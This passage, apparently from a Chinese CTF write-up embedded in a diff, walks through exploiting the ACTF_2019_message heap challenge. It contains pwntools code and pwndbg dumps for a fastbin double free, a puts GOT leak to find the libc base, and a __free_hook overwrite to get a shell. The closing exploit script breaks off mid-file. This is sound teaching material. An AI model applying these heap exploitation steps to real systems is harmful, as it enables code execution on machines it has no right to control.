+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span></span></span></code></pre></td></tr></table></div></div><p>要想获取 shell 权限, 我们必须想办法获取 libc 基址</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-21-1><a class=lnlinks href=#hl-21-1> 1</a>
+</span><span class=lnt id=hl-21-2><a class=lnlinks href=#hl-21-2> 2</a>
+</span><span class=lnt id=hl-21-3><a class=lnlinks href=#hl-21-3> 3</a>
+</span><span class=lnt id=hl-21-4><a class=lnlinks href=#hl-21-4> 4</a>
+</span><span class=lnt id=hl-21-5><a class=lnlinks href=#hl-21-5> 5</a>
+</span><span class=lnt id=hl-21-6><a class=lnlinks href=#hl-21-6> 6</a>
+</span><span class=lnt id=hl-21-7><a class=lnlinks href=#hl-21-7> 7</a>
+</span><span class=lnt id=hl-21-8><a class=lnlinks href=#hl-21-8> 8</a>
+</span><span class=lnt id=hl-21-9><a class=lnlinks href=#hl-21-9> 9</a>
+</span><span class=lnt id=hl-21-10><a class=lnlinks href=#hl-21-10>10</a>
+</span><span class=lnt id=hl-21-11><a class=lnlinks href=#hl-21-11>11</a>
+</span><span class=lnt id=hl-21-12><a class=lnlinks href=#hl-21-12>12</a>
+</span><span class=lnt id=hl-21-13><a class=lnlinks href=#hl-21-13>13</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=s2>&#34;aaaa&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=s2>&#34;bbbb&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x78</span><span class=p>,</span> <span class=s1>&#39;cccc&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># delete(0)</span>
+</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># 0 &lt;- 1 &lt;- 0</span>
+</span></span><span class=line><span class=cl>    <span class=nb>list</span> <span class=o>=</span> <span class=mh>0x602060</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=nb>list</span> <span class=o>+</span> <span class=mh>0x18</span><span class=p>))</span> <span class=c1># 0</span></span></span></code></pre></td></tr></table></div></div><p>我们考虑通过两个 chunk 来达成 double free 的效果<br>然后通过 double free 来申请到第三个 chunk 这块空间<br>因为 fastbin chunk 被分配时有安全检查的, 所以 chunk3 的 size 必须要比前面的 chunk 的 size 大 0x10 bytes</p><p>double free 之后但未修改 fd 指针</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-22-1><a class=lnlinks href=#hl-22-1> 1</a>
+</span><span class=lnt id=hl-22-2><a class=lnlinks href=#hl-22-2> 2</a>
+</span><span class=lnt id=hl-22-3><a class=lnlinks href=#hl-22-3> 3</a>
+</span><span class=lnt id=hl-22-4><a class=lnlinks href=#hl-22-4> 4</a>
+</span><span class=lnt id=hl-22-5><a class=lnlinks href=#hl-22-5> 5</a>
+</span><span class=lnt id=hl-22-6><a class=lnlinks href=#hl-22-6> 6</a>
+</span><span class=lnt id=hl-22-7><a class=lnlinks href=#hl-22-7> 7</a>
+</span><span class=lnt id=hl-22-8><a class=lnlinks href=#hl-22-8> 8</a>
+</span><span class=lnt id=hl-22-9><a class=lnlinks href=#hl-22-9> 9</a>
+</span><span class=lnt id=hl-22-10><a class=lnlinks href=#hl-22-10>10</a>
+</span><span class=lnt id=hl-22-11><a class=lnlinks href=#hl-22-11>11</a>
+</span><span class=lnt id=hl-22-12><a class=lnlinks href=#hl-22-12>12</a>
+</span><span class=lnt id=hl-22-13><a class=lnlinks href=#hl-22-13>13</a>
+</span><span class=lnt id=hl-22-14><a class=lnlinks href=#hl-22-14>14</a>
+</span><span class=lnt id=hl-22-15><a class=lnlinks href=#hl-22-15>15</a>
+</span><span class=lnt id=hl-22-16><a class=lnlinks href=#hl-22-16>16</a>
+</span><span class=lnt id=hl-22-17><a class=lnlinks href=#hl-22-17>17</a>
+</span><span class=lnt id=hl-22-18><a class=lnlinks href=#hl-22-18>18</a>
+</span><span class=lnt id=hl-22-19><a class=lnlinks href=#hl-22-19>19</a>
+</span><span class=lnt id=hl-22-20><a class=lnlinks href=#hl-22-20>20</a>
+</span><span class=lnt id=hl-22-21><a class=lnlinks href=#hl-22-21>21</a>
+</span><span class=lnt id=hl-22-22><a class=lnlinks href=#hl-22-22>22</a>
+</span><span class=lnt id=hl-22-23><a class=lnlinks href=#hl-22-23>23</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwndbg&gt; x/20gx 0x602060
+</span></span><span class=line><span class=cl>0x602060:       0x0000000000000000      0x00000000306cf010
+</span></span><span class=line><span class=cl>0x602070:       0x0000000000000000      0x00000000306cf080
+</span></span><span class=line><span class=cl>0x602080:       0x0000000000000078      0x00000000306cf0f0
+</span></span><span class=line><span class=cl>0x602090:       0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>0x6020a0:       0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>0x6020b0:       0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>0x6020c0:       0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>0x6020d0:       0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>0x6020e0:       0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>0x6020f0:       0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>pwndbg&gt; fastbins
+</span></span><span class=line><span class=cl>pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.
+</span></span><span class=line><span class=cl>This might not work in all cases. Use <span class=sb>`</span><span class=nb>help</span> <span class=nb>set</span> resolve-heap-via-heuristic<span class=sb>`</span> <span class=k>for</span> more details.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>fastbins
+</span></span><span class=line><span class=cl>0x70: 0x306cf000 —▸ 0x306cf070 ◂— 0x306cf000
+</span></span><span class=line><span class=cl>pwndbg&gt; x/8gx 0x306cf000
+</span></span><span class=line><span class=cl>0x306cf000:     0x0000000000000000      0x0000000000000071
+</span></span><span class=line><span class=cl>0x306cf010:     0x00000000306cf070      0x0000000000000000
+</span></span><span class=line><span class=cl>0x306cf020:     0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>0x306cf030:     0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>pwndbg&gt;</span></span></code></pre></td></tr></table></div></div><p>double free 之后修改 fd 指针</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-23-1><a class=lnlinks href=#hl-23-1> 1</a>
+</span><span class=lnt id=hl-23-2><a class=lnlinks href=#hl-23-2> 2</a>
+</span><span class=lnt id=hl-23-3><a class=lnlinks href=#hl-23-3> 3</a>
+</span><span class=lnt id=hl-23-4><a class=lnlinks href=#hl-23-4> 4</a>
+</span><span class=lnt id=hl-23-5><a class=lnlinks href=#hl-23-5> 5</a>
+</span><span class=lnt id=hl-23-6><a class=lnlinks href=#hl-23-6> 6</a>
+</span><span class=lnt id=hl-23-7><a class=lnlinks href=#hl-23-7> 7</a>
+</span><span class=lnt id=hl-23-8><a class=lnlinks href=#hl-23-8> 8</a>
+</span><span class=lnt id=hl-23-9><a class=lnlinks href=#hl-23-9> 9</a>
+</span><span class=lnt id=hl-23-10><a class=lnlinks href=#hl-23-10>10</a>
+</span><span class=lnt id=hl-23-11><a class=lnlinks href=#hl-23-11>11</a>
+</span><span class=lnt id=hl-23-12><a class=lnlinks href=#hl-23-12>12</a>
+</span><span class=lnt id=hl-23-13><a class=lnlinks href=#hl-23-13>13</a>
+</span><span class=lnt id=hl-23-14><a class=lnlinks href=#hl-23-14>14</a>
+</span><span class=lnt id=hl-23-15><a class=lnlinks href=#hl-23-15>15</a>
+</span><span class=lnt id=hl-23-16><a class=lnlinks href=#hl-23-16>16</a>
+</span><span class=lnt id=hl-23-17><a class=lnlinks href=#hl-23-17>17</a>
+</span><span class=lnt id=hl-23-18><a class=lnlinks href=#hl-23-18>18</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>x</span><span class=o>/</span><span class=mi>20</span><span class=n>gx</span> <span class=mh>0x602060</span>
+</span></span><span class=line><span class=cl><span class=mh>0x602060</span><span class=p>:</span>       <span class=mh>0x0000000000000000</span>      <span class=mh>0x00000000321e6010</span>
+</span></span><span class=line><span class=cl><span class=mh>0x602070</span><span class=p>:</span>       <span class=mh>0x0000000000000000</span>      <span class=mh>0x00000000321e6080</span>
+</span></span><span class=line><span class=cl><span class=mh>0x602080</span><span class=p>:</span>       <span class=mh>0x0000000000000078</span>      <span class=mh>0x00000000321e60f0</span>
+</span></span><span class=line><span class=cl><span class=mh>0x602090</span><span class=p>:</span>       <span class=mh>0x0000000000000068</span>      <span class=mh>0x00000000321e6010</span>
+</span></span><span class=line><span class=cl><span class=mh>0x6020a0</span><span class=p>:</span>       <span class=mh>0x0000000000000000</span>      <span class=mh>0x0000000000000000</span>
+</span></span><span class=line><span class=cl><span class=mh>0x6020b0</span><span class=p>:</span>       <span class=mh>0x0000000000000000</span>      <span class=mh>0x0000000000000000</span>
+</span></span><span class=line><span class=cl><span class=mh>0x6020c0</span><span class=p>:</span>       <span class=mh>0x0000000000000000</span>      <span class=mh>0x0000000000000000</span>
+</span></span><span class=line><span class=cl><span class=mh>0x6020d0</span><span class=p>:</span>       <span class=mh>0x0000000000000000</span>      <span class=mh>0x0000000000000000</span>
+</span></span><span class=line><span class=cl><span class=mh>0x6020e0</span><span class=p>:</span>       <span class=mh>0x0000000000000000</span>      <span class=mh>0x0000000000000000</span>
+</span></span><span class=line><span class=cl><span class=mh>0x6020f0</span><span class=p>:</span>       <span class=mh>0x0000000000000000</span>      <span class=mh>0x0000000000000000</span>
+</span></span><span class=line><span class=cl><span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>fastbins</span>
+</span></span><span class=line><span class=cl><span class=n>pwndbg</span> <span class=n>will</span> <span class=k>try</span> <span class=n>to</span> <span class=n>resolve</span> <span class=n>the</span> <span class=n>heap</span> <span class=n>symbols</span> <span class=n>via</span> <span class=n>heuristic</span> <span class=n>now</span> <span class=n>since</span> <span class=n>we</span> <span class=n>cannot</span> <span class=n>resolve</span> <span class=n>the</span> <span class=n>heap</span> <span class=n>via</span> <span class=n>the</span> <span class=n>debug</span> <span class=n>symbols</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=n>This</span> <span class=n>might</span> <span class=ow>not</span> <span class=n>work</span> <span class=ow>in</span> <span class=nb>all</span> <span class=n>cases</span><span class=o>.</span> <span class=n>Use</span> <span class=err>`</span><span class=n>help</span> <span class=nb>set</span> <span class=n>resolve</span><span class=o>-</span><span class=n>heap</span><span class=o>-</span><span class=n>via</span><span class=o>-</span><span class=n>heuristic</span><span class=err>`</span> <span class=k>for</span> <span class=n>more</span> <span class=n>details</span><span class=o>.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>fastbins</span>
+</span></span><span class=line><span class=cl><span class=mh>0x70</span><span class=p>:</span> <span class=mh>0x321e6070</span> <span class=err>—▸</span> <span class=mh>0x321e6000</span> <span class=err>—▸</span> <span class=mh>0x602078</span> <span class=err>—▸</span> <span class=mh>0x321e60f0</span> <span class=err>◂—</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=n>pwndbg</span><span class=o>&gt;</span></span></span></code></pre></td></tr></table></div></div><p>我们只需要一直申请就能拿到 0x602078 + 0x10 这块空间的所有权, 我们将 0x602078 + 0x10 的指针修改为 puts_got 就能使用 display 来泄露 puts 函数的真实地址了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-24-1><a class=lnlinks href=#hl-24-1>1</a>
+</span><span class=lnt id=hl-24-2><a class=lnlinks href=#hl-24-2>2</a>
+</span><span class=lnt id=hl-24-3><a class=lnlinks href=#hl-24-3>3</a>
+</span><span class=lnt id=hl-24-4><a class=lnlinks href=#hl-24-4>4</a>
+</span><span class=lnt id=hl-24-5><a class=lnlinks href=#hl-24-5>5</a>
+</span><span class=lnt id=hl-24-6><a class=lnlinks href=#hl-24-6>6</a>
+</span><span class=lnt id=hl-24-7><a class=lnlinks href=#hl-24-7>7</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=s1>&#39;/bin/sh&#39;</span><span class=p>)</span> <span class=c1># 1</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=s1>&#39;bbbb&#39;</span><span class=p>)</span> <span class=c1># 0</span>
+</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl>    <span class=n>puts_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>display</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;puts_addr: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>puts_addr</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>libc_base</span> <span class=o>=</span> <span class=n>puts_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;libc_base: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>看一下此时的内存空间布局</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-25-1><a class=lnlinks href=#hl-25-1> 1</a>
+</span><span class=lnt id=hl-25-2><a class=lnlinks href=#hl-25-2> 2</a>
+</span><span class=lnt id=hl-25-3><a class=lnlinks href=#hl-25-3> 3</a>
+</span><span class=lnt id=hl-25-4><a class=lnlinks href=#hl-25-4> 4</a>
+</span><span class=lnt id=hl-25-5><a class=lnlinks href=#hl-25-5> 5</a>
+</span><span class=lnt id=hl-25-6><a class=lnlinks href=#hl-25-6> 6</a>
+</span><span class=lnt id=hl-25-7><a class=lnlinks href=#hl-25-7> 7</a>
+</span><span class=lnt id=hl-25-8><a class=lnlinks href=#hl-25-8> 8</a>
+</span><span class=lnt id=hl-25-9><a class=lnlinks href=#hl-25-9> 9</a>
+</span><span class=lnt id=hl-25-10><a class=lnlinks href=#hl-25-10>10</a>
+</span><span class=lnt id=hl-25-11><a class=lnlinks href=#hl-25-11>11</a>
+</span><span class=lnt id=hl-25-12><a class=lnlinks href=#hl-25-12>12</a>
+</span><span class=lnt id=hl-25-13><a class=lnlinks href=#hl-25-13>13</a>
+</span><span class=lnt id=hl-25-14><a class=lnlinks href=#hl-25-14>14</a>
+</span><span class=lnt id=hl-25-15><a class=lnlinks href=#hl-25-15>15</a>
+</span><span class=lnt id=hl-25-16><a class=lnlinks href=#hl-25-16>16</a>
+</span><span class=lnt id=hl-25-17><a class=lnlinks href=#hl-25-17>17</a>
+</span><span class=lnt id=hl-25-18><a class=lnlinks href=#hl-25-18>18</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwndbg&gt; x/20gx 0x602060
+</span></span><span class=line><span class=cl>0x602060:       0x0000000000000000      0x000000003eb3b010
+</span></span><span class=line><span class=cl>0x602070:       0x0000000000000000      0x000000003eb3b080
+</span></span><span class=line><span class=cl>0x602080:       0x0000000000000078      0x0000000000601f98
+</span></span><span class=line><span class=cl>0x602090:       0x0000000000000068      0x000000003eb3b010
+</span></span><span class=line><span class=cl>0x6020a0:       0x0000000000000068      0x000000003eb3b080
+</span></span><span class=line><span class=cl>0x6020b0:       0x0000000000000068      0x000000003eb3b010
+</span></span><span class=line><span class=cl>0x6020c0:       0x0000000000000068      0x0000000000602088
+</span></span><span class=line><span class=cl>0x6020d0:       0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>0x6020e0:       0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>0x6020f0:       0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>pwndbg&gt; fastbins
+</span></span><span class=line><span class=cl>pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.
+</span></span><span class=line><span class=cl>This might not work in all cases. Use <span class=sb>`</span><span class=nb>help</span> <span class=nb>set</span> resolve-heap-via-heuristic<span class=sb>`</span> <span class=k>for</span> more details.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>fastbins
+</span></span><span class=line><span class=cl>0x70: 0x3eb3b0f0 ◂— <span class=m>0</span>
+</span></span><span class=line><span class=cl>pwndbg&gt;</span></span></code></pre></td></tr></table></div></div><p>此时我们无法在刚才的基础上继续 malloc 了, 因为刚才我们填入了 puts_got 地址, got 地址因为 FULL RELRO 的原因无可写权限的<br>但是我们注意到了我们最后申请出来的 chunk 正好可以修改 chunk2 的指针, 我们使用 edit 将其修改指向 <code>__free_hook</code> 然后使用 free 含有 <code>/bin/sh</code> 字符串的 chunk 即可 getshell</p><p>exp.py:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-26-1><a class=lnlinks href=#hl-26-1> 1</a>
+</span><span class=lnt id=hl-26-2><a class=lnlinks href=#hl-26-2> 2</a>
+</span><span class=lnt id=hl-26-3><a class=lnlinks href=#hl-26-3> 3</a>
+</span><span class=lnt id=hl-26-4><a class=lnlinks href=#hl-26-4> 4</a>
+</span><span class=lnt id=hl-26-5><a class=lnlinks href=#hl-26-5> 5</a>
+</span><span class=lnt id=hl-26-6><a class=lnlinks href=#hl-26-6> 6</a>
+</span><span class=lnt id=hl-26-7><a class=lnlinks href=#hl-26-7> 7</a>
+</span><span class=lnt id=hl-26-8><a class=lnlinks href=#hl-26-8> 8</a>
+</span><span class=lnt id=hl-26-9><a class=lnlinks href=#hl-26-9> 9</a>
+</span><span class=lnt id=hl-26-10><a class=lnlinks href=#hl-26-10>10</a>
+</span><span class=lnt id=hl-26-11><a class=lnlinks href=#hl-26-11>11</a>
+</span><span class=lnt id=hl-26-12><a class=lnlinks href=#hl-26-12>12</a>
+</span><span class=lnt id=hl-26-13><a class=lnlinks href=#hl-26-13>13</a>
+</span><span class=lnt id=hl-26-14><a class=lnlinks href=#hl-26-14>14</a>
+</span><span class=lnt id=hl-26-15><a class=lnlinks href=#hl-26-15>15</a>
+</span><span class=lnt id=hl-26-16><a class=lnlinks href=#hl-26-16>16</a>
+</span><span class=lnt id=hl-26-17><a class=lnlinks href=#hl-26-17>17</a>
+</span><span class=lnt id=hl-26-18><a class=lnlinks href=#hl-26-18>18</a>
+</span><span class=lnt id=hl-26-19><a class=lnlinks href=#hl-26-19>19</a>
+</span><span class=lnt id=hl-26-20><a class=lnlinks href=#hl-26-20>20</a>
+</span><span class=lnt id=hl-26-21><a class=lnlinks href=#hl-26-21>21</a>
+</span><span class=lnt id=hl-26-22><a class=lnlinks href=#hl-26-22>22</a>
+</span><span class=lnt id=hl-26-23><a class=lnlinks href=#hl-26-23>23</a>
+</span><span class=lnt id=hl-26-24><a class=lnlinks href=#hl-26-24>24</a>
+</span><span class=lnt id=hl-26-25><a class=lnlinks href=#hl-26-25>25</a>
+</span><span class=lnt id=hl-26-26><a class=lnlinks href=#hl-26-26>26</a>
+</span><span class=lnt id=hl-26-27><a class=lnlinks href=#hl-26-27>27</a>
+</span><span class=lnt id=hl-26-28><a class=lnlinks href=#hl-26-28>28</a>
+</span><span class=lnt id=hl-26-29><a class=lnlinks href=#hl-26-29>29</a>
+</span><span class=lnt id=hl-26-30><a class=lnlinks href=#hl-26-30>30</a>
+</span><span class=lnt id=hl-26-31><a class=lnlinks href=#hl-26-31>31</a>
+</span><span class=lnt id=hl-26-32><a class=lnlinks href=#hl-26-32>32</a>
+</span><span class=lnt id=hl-26-33><a class=lnlinks href=#hl-26-33>33</a>
+</span><span class=lnt id=hl-26-34><a class=lnlinks href=#hl-26-34>34</a>
+</span><span class=lnt id=hl-26-35><a class=lnlinks href=#hl-26-35>35</a>
+</span><span class=lnt id=hl-26-36><a class=lnlinks href=#hl-26-36>36</a>
+</span><span class=lnt id=hl-26-37><a class=lnlinks href=#hl-26-37>37</a>
+</span><span class=lnt id=hl-26-38><a class=lnlinks href=#hl-26-38>38</a>
+</span><span class=lnt id=hl-26-39><a class=lnlinks href=#hl-26-39>39</a>
+</span><span class=lnt id=hl-26-40><a class=lnlinks href=#hl-26-40>40</a>
+</span><span class=lnt id=hl-26-41><a class=lnlinks href=#hl-26-41>41</a>
+</span><span class=lnt id=hl-26-42><a class=lnlinks href=#hl-26-42>42</a>
+</span><span class=lnt id=hl-26-43><a class=lnlinks href=#hl-26-43>43</a>
+</span><span class=lnt id=hl-26-44><a class=lnlinks href=#hl-26-44>44</a>
+</span><span class=lnt id=hl-26-45><a class=lnlinks href=#hl-26-45>45</a>
+</span><span class=lnt id=hl-26-46><a class=lnlinks href=#hl-26-46>46</a>
+</span><span class=lnt id=hl-26-47><a class=lnlinks href=#hl-26-47>47</a>
+</span><span class=lnt id=hl-26-48><a class=lnlinks href=#hl-26-48>48</a>
+</span><span class=lnt id=hl-26-49><a class=lnlinks href=#hl-26-49>49</a>
+</span><span class=lnt id=hl-26-50><a class=lnlinks href=#hl-26-50>50</a>
+</span><span class=lnt id=hl-26-51><a class=lnlinks href=#hl-26-51>51</a>
+</span><span class=lnt id=hl-26-52><a class=lnlinks href=#hl-26-52>52</a>
+</span><span class=lnt id=hl-26-53><a class=lnlinks href=#hl-26-53>53</a>
+</span><span class=lnt id=hl-26-54><a class=lnlinks href=#hl-26-54>54</a>
+</span><span class=lnt id=hl-26-55><a class=lnlinks href=#hl-26-55>55</a>
+</span><span class=lnt id=hl-26-56><a class=lnlinks href=#hl-26-56>56</a>
+</span><span class=lnt id=hl-26-57><a class=lnlinks href=#hl-26-57>57</a>
+</span><span class=lnt id=hl-26-58><a class=lnlinks href=#hl-26-58>58</a>
+</span><span class=lnt id=hl-26-59><a class=lnlinks href=#hl-26-59>59</a>
+</span><span class=lnt id=hl-26-60><a class=lnlinks href=#hl-26-60>60</a>
+</span><span class=lnt id=hl-26-61><a class=lnlinks href=#hl-26-61>61</a>
+</span><span class=lnt id=hl-26-62><a class=lnlinks href=#hl-26-62>62</a>
+</span><span class=lnt id=hl-26-63><a class=lnlinks href=#hl-26-63>63</a>
+</span><span class=lnt id=hl-26-64><a class=lnlinks href=#hl-26-64>64</a>
+</span><span class=lnt id=hl-26-65><a class=lnlinks href=#hl-26-65>65</a>
+</span><span class=lnt id=hl-26-66><a class=lnlinks href=#hl-26-66>66</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./ACTF_2019_message&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./ACTF_2019_message&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;/home/lhon901/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>choice</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;choice: &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>n</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=nb>len</span><span class=p>,</span> <span class=n>message</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Please input the length of message:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Please input the message:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>message</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Please input index of message you want to delete:&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>message</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Please input index of message you want to edit:&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Now you can edit the message:&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>message</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>display</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
